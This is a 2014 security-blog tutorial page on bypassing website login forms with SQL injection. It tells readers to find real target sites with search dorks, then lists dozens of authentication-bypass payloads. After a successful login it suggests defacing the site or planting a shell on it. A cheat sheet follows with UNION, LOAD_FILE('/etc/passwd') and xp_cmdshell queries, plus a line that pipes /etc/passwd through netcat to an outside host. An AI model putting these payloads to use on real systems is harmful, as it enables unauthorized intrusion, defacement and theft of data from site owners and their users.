@@ -1,0 +1,441 @@
+
+ <!DOCTYPE HTML>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>SQLi--PART II:Bypassing Login pages on websites using SQL injectable queries |     tudouya&#39;s secblog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="tudouya">
+    
+    <meta name="description" content="PrefaceAlright in this tutorial, we’ll be learning how to bypass login pages with the help of MySequel injection using Login Queries.Please visit part">
+    
+    
+    
+    
+    <link rel="alternative" href="/atom.xml" title="    tudouya&#39;s secblog" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="stylesheet" href="/css/style.css">
+    <link href="//cdn.bootcss.com/highlight.js/9.1.0/styles/railscasts.min.css" rel="stylesheet">
+    <style type="text/css">
+      figure {
+        overflow-x: auto;
+      }
+    </style>
+</head>
+
+  <body>
+    <header>
+      <div>
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="    tudouya&#39;s secblog">    tudouya&#39;s secblog</a></h1>
+				<h2 class="blog-motto">~The quieter you become,the more you can hear~</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/sitemap.xml">sitemap</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+					<li><form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="hidden" name="q" value="site:sec.php101.cn">
+					</form></li>
+				</ul>
+			</nav>
+</div>
+    </header>
+    <div id="wrap">
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+    <time datetime="2014-10-30T10:15:39.000Z" itemprop="datePublished">
+      <a href="/2014/10/30/SQLi--PART-IIBypassing-Login-pages-on-websites-using-SQL-injectable-queries/" title="SQLi--PART II:Bypassing Login pages on websites using SQL injectable queries" itemprop="url" class="article-time">2014-10-30</a>
+    </time>
+
+  <h1 itemprop="name" class="article-name">
+    
+      <a href="/2014/10/30/SQLi--PART-IIBypassing-Login-pages-on-websites-using-SQL-injectable-queries/" title="SQLi--PART II:Bypassing Login pages on websites using SQL injectable queries" itemprop="url"><span>SQLi--PART II:Bypassing Login pages on websites using SQL injectable queries</span></a>
+  </h1>
+</header>
+
+	<div class="article-content">
+		
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">文章目录</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Preface"><span class="toc-number">1.</span> <span class="toc-text">Preface</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#What-is-SQL-injection"><span class="toc-number">2.</span> <span class="toc-text">What is SQL injection?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step1-Finding-websites-with-Login-Pages"><span class="toc-number">3.</span> <span class="toc-text">Step1: Finding websites with Login Pages</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step2-Now-Executing-the-query"><span class="toc-number">4.</span> <span class="toc-text">Step2: Now Executing the query</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step3-I-LOGGED-in-what-to-do-now"><span class="toc-number">5.</span> <span class="toc-text">Step3: I LOGGED in, what to do now?!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Extras"><span class="toc-number">6.</span> <span class="toc-text">Extras</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Common-Password-Queries"><span class="toc-number">6.1.</span> <span class="toc-text">Common Password Queries</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#If-version-of-Database-is-greater-than-5"><span class="toc-number">6.2.</span> <span class="toc-text">If version of Database is greater than 5</span></a></li></ol></li></ol>
+		
+		</div>
+		
+		<h2 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h2><p>Alright in this tutorial, we’ll be learning how to bypass login pages with the help of MySequel injection using Login Queries.<br>Please visit part 1 if you haven’t seen it yet: <a href="http://tdyhacker.github.io/2014/10/30/MegaSQLi--part-IDorks/" target="_blank" rel="external">http://tdyhacker.github.io/2014/10/30/MegaSQLi–part-IDorks/</a></p>
+<h2 id="What-is-SQL-injection"><a href="#What-is-SQL-injection" class="headerlink" title="What is SQL injection?"></a>What is SQL injection?</h2><p><strong>Answer:</strong> Basically, it’s a process where you execute a certain query in a website in order to extract information such as log-in information, users etc. for either personal gain or random use from the website’s database.</p>
+<p>There are many type of certain queries that can be executed in order to illegally extract information from the website’s database.  </p>
+<p>In this tutorial the query we’ll be using is Basic SQL injection query where it can be executed in a login page.</p>
+<p>Example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username: admin</span><br><span class="line">Password: ‘ or ‘1’=’1</span><br></pre></td></tr></table></figure></p>
+<p>When you enter the password “‘or ‘1’=’1” in most website, there’s a chance you can gain access.  </p>
+<p>How does it happen? Look at the code when we execute that query?<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users </span><br><span class="line">WHERE username = ‘admin’</span><br><span class="line">AND password = ‘ ‘ or ‘1’=’1’</span><br></pre></td></tr></table></figure></p>
+<p>In the password field, we inserted a quote ‘ first, then a bunch of random characters like “1”.  </p>
+<p>The database always scans for rows and hence in the query we have executed, there’s only 1 row which states that there’s no reason for the login to be incorrect.   </p>
+<p>However, some websites can filter out these type of queries, so it’s best to use different ones too. You can find some below.  </p>
+<p>Now that you have an idea of how Basic SQL injection queries work, lets try and put it to use shall we ?</p>
+<h2 id="Step1-Finding-websites-with-Login-Pages"><a href="#Step1-Finding-websites-with-Login-Pages" class="headerlink" title="Step1: Finding websites with Login Pages"></a>Step1: Finding websites with Login Pages</h2><p>Alright, out basic approach is to find a couple of websites with login pages so that we can execute our query in order to bypass it.<br>For this, we can use dorks.<br>In this tutorial, we can use these dorks:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">inurl:/login.php</span><br><span class="line">inurl:/admin.php</span><br><span class="line">inurl:/admin</span><br><span class="line">inurl:/login.html</span><br></pre></td></tr></table></figure></p>
+<p>If you want to find more dorks when using this method, you can find them here:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pastebin.com/ZjxpivV3</span><br></pre></td></tr></table></figure></p>
+<h2 id="Step2-Now-Executing-the-query"><a href="#Step2-Now-Executing-the-query" class="headerlink" title="Step2: Now Executing the query"></a>Step2: Now Executing the query</h2><p>Alright, now that you’ve found your target with a log in page, lets play with it a bit.<br>So here’s what you’re gonna do:<br>Username will be admin, cause most sites are having admin data stored in their databases<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username: admin</span><br><span class="line">Password: &apos; or 0=0 --</span><br></pre></td></tr></table></figure></p>
+<p>Didn’t work? No worries, there’s more to that than just a single query.<br>Here’s a list of queried passwords you can use to hopefully inject the site.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">&apos; or &apos;1&apos;=&apos;1</span><br><span class="line">&apos; or &apos;x&apos;=&apos;x</span><br><span class="line">&apos; or 0=0 --</span><br><span class="line">&quot; or 0=0 --</span><br><span class="line">or 0=0 --</span><br><span class="line">&apos; or 0=0 #</span><br><span class="line">&quot; or 0=0 #</span><br><span class="line">or 0=0 #</span><br><span class="line">&apos; or &apos;x&apos;=&apos;x</span><br><span class="line">&quot; or &quot;x&quot;=&quot;x</span><br><span class="line">&apos;) or (&apos;x&apos;=&apos;x</span><br><span class="line">&apos; or 1=1--</span><br><span class="line">&quot; or 1=1--</span><br><span class="line">or 1=1--</span><br><span class="line">&apos; or a=a--</span><br><span class="line">&quot; or &quot;a&quot;=&quot;a</span><br><span class="line">&apos;) or (&apos;a&apos;=&apos;a</span><br><span class="line">&quot;) or (&quot;a&quot;=&quot;a</span><br><span class="line">hi&quot; or &quot;a&quot;=&quot;a</span><br><span class="line">hi&quot; or 1=1 --</span><br><span class="line">hi&apos; or 1=1 --</span><br><span class="line">&apos;or&apos;1=1&apos;</span><br><span class="line">==</span><br><span class="line">and 1=1--</span><br><span class="line">and 1=1</span><br><span class="line">&apos; or &apos;one&apos;=&apos;one--</span><br><span class="line">&apos; or &apos;one&apos;=&apos;one</span><br><span class="line">&apos; and &apos;one&apos;=&apos;one</span><br><span class="line">&apos; and &apos;one&apos;=&apos;one--</span><br><span class="line">1&apos;) and &apos;1&apos;=&apos;1--</span><br><span class="line">admin&apos; --</span><br><span class="line">admin&apos; #</span><br><span class="line">admin&apos;/*</span><br><span class="line">or 1=1--</span><br><span class="line">or 1=1#</span><br><span class="line">or 1=1/*</span><br><span class="line">) or &apos;1&apos;=&apos;1--</span><br><span class="line">) or (&apos;1&apos;=&apos;1--</span><br><span class="line">&apos; or &apos;1&apos;=&apos;1</span><br><span class="line">&apos; or &apos;x&apos;=&apos;x</span><br><span class="line">&apos; or 0=0 --</span><br><span class="line">&quot; or 0=0 --</span><br><span class="line">or 0=0 --</span><br><span class="line">&apos; or 0=0 #</span><br><span class="line">&quot; or 0=0 #</span><br><span class="line">or 0=0 #</span><br><span class="line">&apos; or &apos;x&apos;=&apos;x</span><br><span class="line">&quot; or &quot;x&quot;=&quot;x</span><br><span class="line">&apos;) or (&apos;x&apos;=&apos;x</span><br><span class="line">&apos; or 1=1--</span><br><span class="line">&quot; or 1=1--</span><br><span class="line">or 1=1--</span><br><span class="line">&apos; or a=a--</span><br><span class="line">&quot; or &quot;a&quot;=&quot;a</span><br><span class="line">&apos;) or (&apos;a&apos;=&apos;a</span><br><span class="line">&quot;) or (&quot;a&quot;=&quot;a</span><br><span class="line">hi&quot; or &quot;a&quot;=&quot;a</span><br><span class="line">hi&quot; or 1=1 --</span><br><span class="line">hi&apos; or 1=1 --</span><br><span class="line">&apos;or&apos;1=1&apos;</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>Note: Sometimes, this is not the best way of hacking websites with SQL injection but I guarantee, you’ll be a successful patient SQL injector and get used to this method.</p>
+</blockquote>
+<h2 id="Step3-I-LOGGED-in-what-to-do-now"><a href="#Step3-I-LOGGED-in-what-to-do-now" class="headerlink" title="Step3: I LOGGED in, what to do now?!"></a>Step3: I LOGGED in, what to do now?!</h2><p>Well, first off, if you did login, then congratz on your first successful attempt of SQL injection.<br>So, there are basically many things you can do with the site.<br>Most people would love to deface it.<br>Others will just shell it and have other uses such as rooting, webhosting etc.<br>If would like to deface the website, locate the homepage and replace it with your deface page.  </p>
+<h2 id="Extras"><a href="#Extras" class="headerlink" title="Extras"></a>Extras</h2><h3 id="Common-Password-Queries"><a href="#Common-Password-Queries" class="headerlink" title="Common Password Queries"></a>Common Password Queries</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; --</span><br><span class="line">admin&apos; #</span><br><span class="line">admin&apos;/*</span><br><span class="line">&apos; or 1=1--</span><br><span class="line">&apos; or 1=1#</span><br><span class="line">&apos; or 1=1/*</span><br><span class="line">&apos;) or &apos;1&apos;=&apos;1--</span><br><span class="line">&apos;) or (&apos;1&apos;=&apos;1--</span><br></pre></td></tr></table></figure>
+<h3 id="If-version-of-Database-is-greater-than-5"><a href="#If-version-of-Database-is-greater-than-5" class="headerlink" title="If version of Database is greater than 5"></a>If version of Database is greater than 5</h3><p>If version of Database is greater than 5, then queries with UNION,group, @@version,orderby,benchmark etc can be executed.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line">1234&apos; AND 1=0 UNION ALL SELECT &apos;admin&apos;</span><br><span class="line">&apos; HAVING 1=1 --</span><br><span class="line">&apos; GROUP BY table.columnfromerror1 HAVING 1=1 --</span><br><span class="line">@@version</span><br><span class="line">select @@version</span><br><span class="line">select @@servername</span><br><span class="line">select @@microsoftversion</span><br><span class="line">select * from master..sysservers</span><br><span class="line">select * from sysusers</span><br><span class="line">exec master..xp_cmdshell &apos;ipconfig+/all&apos;</span><br><span class="line">exec master..xp_cmdshell &apos;net+view&apos;</span><br><span class="line">exec master..xp_cmdshell &apos;net+users&apos;</span><br><span class="line">SELECT 1 -- comment</span><br><span class="line">SELECT /*comment*/1</span><br><span class="line">ORDER BY 1--</span><br><span class="line">&apos; union all select sum(columntofind) from users--</span><br><span class="line">UNION ALL SELECT null</span><br><span class="line">SELECT name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = &apos;tablenameforcolumnnames&apos;)</span><br><span class="line">SELECT TOP n columns</span><br><span class="line">select * from OPENROWSET(&apos;MSDASQL&apos;</span><br><span class="line">select * from OPENROWSET(&apos;SQLOLEDB&apos;</span><br><span class="line">masters..sysxlogins</span><br><span class="line">sys.sql_logins</span><br><span class="line">SELECT/*avoid-spaces*/password/**/FROM/**/Members</span><br><span class="line">SELECT CHAR(0x66)</span><br><span class="line">SELECT * FROM members</span><br><span class="line">@@version</span><br><span class="line">SELECT USER();</span><br><span class="line">select host</span><br><span class="line">SELECT 1;</span><br><span class="line">SELECT /*comment*/1;</span><br><span class="line">ORDER BY 1--</span><br><span class="line">UNION ALL SELECT null</span><br><span class="line">SELECT schema_name FROM information_schema.schemata;</span><br><span class="line">SELECT table_schema</span><br><span class="line">SELECT grantee</span><br><span class="line">limit 1</span><br><span class="line">SELECT host</span><br><span class="line">IF EXISTS (SELECT * FROM users WHERE username = &apos;root&apos;) BENCHMARK(100</span><br><span class="line">select benchmark( 500</span><br><span class="line">SELECT CHAR(75)+CHAR(76)+CHAR(77)</span><br><span class="line">SELECT ascii(&apos;A&apos;)</span><br><span class="line">SELECT CONCAT(&apos;0x&apos;</span><br><span class="line">SELECT/*avoid-spaces*/password/**/FROM/**/Members</span><br><span class="line">SELECT /*!32302 1/0</span><br><span class="line">SELECT 0x5045</span><br><span class="line">SELECT cast(&apos;1&apos; AS unsigned integer);</span><br><span class="line">SELECT cast(&apos;123&apos; AS char);</span><br><span class="line">SELECT IF(1=1</span><br><span class="line">&apos; UNION ALL SELECT LOAD_FILE(&apos;/etc/passwd&apos;) AND &apos;a&apos;=&apos;a</span><br><span class="line">union SELECT LOAD_FILE(0x2f6574632f706173737764)</span><br><span class="line">load data infile &apos;c:/boot.ini&apos; into table foo;</span><br><span class="line"># SELECT ... INTO DUMPFILE</span><br><span class="line">SELECT login || &apos;-&apos; || password FROM members</span><br><span class="line">select versionnumber</span><br><span class="line">select user from sysibm.sysdummy1;</span><br><span class="line">select session_user from sysibm.sysdummy1;</span><br><span class="line">select system_user from sysibm.sysdummy1;</span><br><span class="line">select * from syscat.tabauth;</span><br><span class="line">select current server from sysibm.sysdummy1;</span><br><span class="line">select * from syscat.dbauth where grantee = current user;</span><br><span class="line">select * from syscat.tdbauth where grantee = current user;</span><br><span class="line">select name from sysibm.systables;</span><br><span class="line">select name</span><br><span class="line">SELECT schemaname FROM syscat.schemata;</span><br><span class="line">SELECT foo FROM bar fetch first 1 rows only;</span><br><span class="line">select name from (SELECT name FROM sysibm.systables order by name fetch first N+M-1 rows only) sq order by name desc fetch first N rows only;</span><br><span class="line">select 123 from sysibm.sysdummy1 union select 234 from sysibm.sysdummy1;</span><br><span class="line">SELECT ‘a’ concat ‘b’ concat ‘c’ FROM sysibm.sysdummy1;</span><br><span class="line">SELECT cast(’123&apos; as integer) FROM sysibm.sysdummy1;</span><br><span class="line">select version();</span><br><span class="line">select current_database();</span><br><span class="line">&quot;select current_user;</span><br><span class="line">select session_user;</span><br><span class="line">&quot;SELECT current_setting(&apos;data_directory&apos;);</span><br><span class="line">select current_setting(’log_connections’);</span><br><span class="line">select current_setting(’log_statement’);</span><br><span class="line">&quot;select current_setting(’port’);</span><br><span class="line">select current_setting(’password_encryption’);</span><br><span class="line">select current_setting(’krb_server_keyfile’);</span><br><span class="line">&quot;select current_setting(’virtual_host’);</span><br><span class="line">select current_setting(’port’);</span><br><span class="line">&quot;select current_setting(’config_file’);</span><br><span class="line">&quot;select current_setting(’hba_file’);</span><br><span class="line">&quot;select current_setting(’data_directory’);</span><br><span class="line">LIMIT n</span><br><span class="line">SELECT pg_sleep(10);</span><br><span class="line">SELECT current_database()</span><br><span class="line">SELECT relname</span><br><span class="line">SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN (&apos;r&apos;</span><br><span class="line">SELECT DISTINCT relname FROM pg_class C</span><br><span class="line">SELECT 1; --comment</span><br><span class="line">SELECT /*comment*/1;</span><br><span class="line">SELECT chr(65);</span><br><span class="line">SELECT ascii(&apos;A&apos;);</span><br><span class="line">SELECT CHR(65)||CHR(66);</span><br><span class="line">SELECT usename</span><br><span class="line">SELECT usename FROM pg_user WHERE usesuper IS TRUE</span><br><span class="line">SELECT system(&apos;cat /etc/passwd | nc 10.0.0.1 8080&apos;);</span><br><span class="line">SELECT &apos;A&apos; || &apos;B&apos;;</span><br><span class="line">SELECT CAST(1 as varchar);</span><br><span class="line">SELECT CAST(&apos;1&apos; as int);</span><br><span class="line">SELECT * FROM dblink(&apos;host=put.your.hostname.here user=someuser  dbname=somedb&apos;</span><br><span class="line">select dbmsinfo(’_version’);</span><br><span class="line">select dbmsinfo(’session_user’);</span><br><span class="line">select dbmsinfo(’system_user’);</span><br><span class="line">select dbmsinfo(’database’);</span><br><span class="line">select dbmsinfo(’db_admin’);</span><br><span class="line">select dbmsinfo(’create_table’);</span><br><span class="line">select dbmsinfo(’create_procedure’);</span><br><span class="line">select dbmsinfo(’security_priv’);</span><br><span class="line">select dbmsinfo(’select_syscat’);</span><br><span class="line">select dbmsinfo(’db_privileges’);</span><br><span class="line">select dbmsinfo(’current_priv_mask’);</span><br><span class="line">select top 10 blah from table;</span><br><span class="line">select first 10 blah form table;</span><br><span class="line">select table_name</span><br><span class="line">select relid</span><br><span class="line">select relid</span><br><span class="line">select column_name</span><br><span class="line">select 1 union select 2;</span><br><span class="line">select cast(’123&apos; as integer);</span><br><span class="line">select @@version&quot;</span><br><span class="line">select name from master..syslogins&quot;</span><br><span class="line">select name from master..sysdatabases&quot;</span><br><span class="line">convert(integer</span><br><span class="line">waitfor delay &apos;0:0:5&apos;</span><br></pre></td></tr></table></figure></p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/A-SQLi/">A-SQLi</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/MegaSQLi/">MegaSQLi</a>
+  </div>
+
+
+
+
+<div class="article-share" id="share">
+
+  <div data-url="http://sec.php101.cn/2014/10/30/SQLi--PART-IIBypassing-Login-pages-on-websites-using-SQL-injectable-queries/" data-title="SQLi--PART II:Bypassing Login pages on websites using SQL injectable queries |     tudouya&#39;s secblog" data-tsina="undefined" class="share clearfix">
+  </div>
+
+</div>
+</footer>   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2014/11/01/SQLi--PART-IIIUnion-BasedNormal-SQL-injection/" title="SQLi--PART III:Union Based/Normal SQL Injection">
+  <strong>上一篇：</strong><br/>
+  <span>
+  SQLi--PART III:Union Based/Normal SQL Injection</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2014/10/30/SQLi--PART I:Dorks/"  title="SQLi--PART I:Dorks">
+ <strong>下一篇：</strong><br/> 
+ <span>SQLi--PART I:Dorks
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+<section class="comment">
+	<div class="ds-thread"></div>
+</section>
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">文章目录</strong>
+  <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Preface"><span class="toc-number">1.</span> <span class="toc-text">Preface</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#What-is-SQL-injection"><span class="toc-number">2.</span> <span class="toc-text">What is SQL injection?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step1-Finding-websites-with-Login-Pages"><span class="toc-number">3.</span> <span class="toc-text">Step1: Finding websites with Login Pages</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step2-Now-Executing-the-query"><span class="toc-number">4.</span> <span class="toc-text">Step2: Now Executing the query</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step3-I-LOGGED-in-what-to-do-now"><span class="toc-number">5.</span> <span class="toc-text">Step3: I LOGGED in, what to do now?!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Extras"><span class="toc-number">6.</span> <span class="toc-text">Extras</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Common-Password-Queries"><span class="toc-number">6.1.</span> <span class="toc-text">Common Password Queries</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#If-version-of-Database-is-greater-than-5"><span class="toc-number">6.2.</span> <span class="toc-text">If version of Database is greater than 5</span></a></li></ol></li></ol>
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
+<aside class="clearfix">
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">分类</p>
+		<ul>
+		
+			<li><a href="/categories/A-SQLi/" title="A-SQLi">A-SQLi<sup>7</sup></a></li>
+		
+			<li><a href="/categories/B-XSS/" title="B-XSS">B-XSS<sup>2</sup></a></li>
+		
+			<li><a href="/categories/H-AttackFlow/" title="H-AttackFlow">H-AttackFlow<sup>1</sup></a></li>
+		
+			<li><a href="/categories/T-Tools/" title="T-Tools">T-Tools<sup>1</sup></a></li>
+		
+			<li><a href="/categories/Z-Other/" title="Z-Other">Z-Other<sup>1</sup></a></li>
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">标签</p>
+		<ul class="clearfix">
+		
+			<li><a href="/tags/Blind/" title="Blind">Blind<sup>2</sup></a></li>
+		
+			<li><a href="/tags/Boolean-Based/" title="Boolean Based">Boolean Based<sup>2</sup></a></li>
+		
+			<li><a href="/tags/Dork/" title="Dork">Dork<sup>1</sup></a></li>
+		
+			<li><a href="/tags/Double-Query/" title="Double Query">Double Query<sup>1</sup></a></li>
+		
+			<li><a href="/tags/Error-Based/" title="Error Based">Error Based<sup>1</sup></a></li>
+		
+			<li><a href="/tags/MegaSQLi/" title="MegaSQLi">MegaSQLi<sup>4</sup></a></li>
+		
+			<li><a href="/tags/String-Based/" title="String Based">String Based<sup>1</sup></a></li>
+		
+			<li><a href="/tags/crypt/" title="crypt">crypt<sup>1</sup></a></li>
+		
+			<li><a href="/tags/hash/" title="hash">hash<sup>1</sup></a></li>
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">友情链接</p>
+</div>
+
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS 订阅</a>
+</div>
+
+</aside>
+<div>
+<br />
+</div>
+
+    </div>
+</div>
+    <footer><div id="footer" >
+	
+    <div class="social-font" class="clearfix">
+        
+        <a href="http://weibo.com/5050395856" target="_blank" class="icon-weibo" title="weibo"></a>
+        
+        
+        <a href="https://github.com/tudouya" target="_blank" class="icon-github" title="github"></a>
+        
+        
+        
+        
+        
+        
+        <a href="mailto:568865013@qq.com" target="_blank" class="icon-email" title="Email Me"></a>
+        
+    </div>
+	<section class="info">
+		<p class="l1">
+            keep foolish~keep hungry
+        </p>
+            <!-- <br/> -->
+        <p class="l2">
+			～如果我们不选择堕落，那么地狱的存在还有什么意义～
+        </p>
+	</section>
+	 
+		<p class="copyright">Powered by <a href="http://zespia.tw/hexo/" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/RagingCat/hexo-theme-ragingcat" target="_blank" title="hexo-theme-ragingcat">Raging Cat</a> © 2016
+		
+		<a href="http://sec.php101.cn/about" target="_blank" title="tudouya">tudouya</a>
+		
+		</p>
+</div></footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize();
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+      
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
